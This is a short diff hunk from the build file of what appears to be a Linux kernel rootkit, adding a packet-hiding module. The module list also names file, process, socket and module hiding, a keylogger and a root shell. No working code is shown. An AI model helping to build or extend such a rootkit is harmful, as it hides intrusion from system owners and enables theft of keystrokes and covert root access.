@@ -9,6 +9,7 @@ rootkit-objs += file_hiding.o
 rootkit-objs += module_hiding.o
 rootkit-objs += socket_hiding.o
 rootkit-objs += process_hiding.o
+rootkit-objs += packet_hiding.o
 rootkit-objs += keylogger.o
 rootkit-objs += rootshell.o
 rootkit-objs += main.o
